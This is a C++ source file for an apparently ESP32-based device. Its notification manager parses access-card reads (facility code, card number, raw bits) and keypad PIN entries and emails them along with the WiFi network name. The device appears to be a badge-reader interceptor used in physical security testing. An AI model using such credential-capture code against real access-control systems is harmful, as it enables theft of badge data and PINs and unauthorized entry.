#include "notification_manager.h"
#include <ArduinoJson.h>
#include <WiFi.h>
#include "email_manager.h"

NotificationManager &NotificationManager::getInstance()
{
    static NotificationManager instance;
    return instance;
}

void NotificationManager::begin()
{
}

void NotificationManager::handleCardRead(const char *cardData)
{
    if (emailManager.isConfigured())
    {
        String data = String(cardData);
        int firstComma = data.indexOf(',');
        int secondComma = data.indexOf(',', firstComma + 1);
        int thirdComma = data.indexOf(',', secondComma + 1);
        int fourthComma = data.indexOf(',', thirdComma + 1);

        if (firstComma != -1 && secondComma != -1 && thirdComma != -1 && fourthComma != -1)
        {
            uint8_t bitCount = data.substring(0, firstComma).toInt();
            uint32_t facilityCode = data.substring(firstComma + 1, secondComma).toInt();
            uint32_t cardNumber = data.substring(secondComma + 1, thirdComma).toInt();
            String csvHEX = data.substring(thirdComma + 1, fourthComma);
            String binData = data.substring(fourthComma + 1);

            emailManager.sendCardData(bitCount, facilityCode, cardNumber, WiFi.SSID(), binData, csvHEX, "");
        }
    }
    processNotification(cardData);
}

void NotificationManager::handlePinRead(const char *pinData)
{
    if (emailManager.isConfigured())
    {
        String data = String(pinData);
        int comma = data.indexOf(',');
        if (comma != -1)
        {
            String pinCode = data.substring(0, comma);
            String binData = data.substring(comma + 1);

            emailManager.sendPinData(pinCode, WiFi.SSID(), binData);
        }
    }
    processNotification(pinData);
}

void NotificationManager::handleWebhook(const char *data)
{
    sendWebhookNotification(data);
}

void NotificationManager::handleWebNotification(const char *data)
{
    sendWebNotification(data);
}

void NotificationManager::updateSettings(const char *data)
{
    JsonDocument doc;
    DeserializationError error = deserializeJson(doc, data);
    if (!error)
    {
        if (doc["enable_email"].is<bool>())
        {
            emailManager.readConfig();
        }
    }
}

void NotificationManager::processNotification(const char *data)
{
}

void NotificationManager::sendEmailNotification(const char *subject, const char *body)
{
    if (emailManager.isConfigured())
    {
        emailManager.sendCardData(0, 0, 0, WiFi.SSID(), body, "", "");
    }
}

void NotificationManager::sendWebhookNotification(const char *data)
{
}

void NotificationManager::sendWebNotification(const char *data)
{
}

NotificationManager &notificationManager = NotificationManager::getInstance();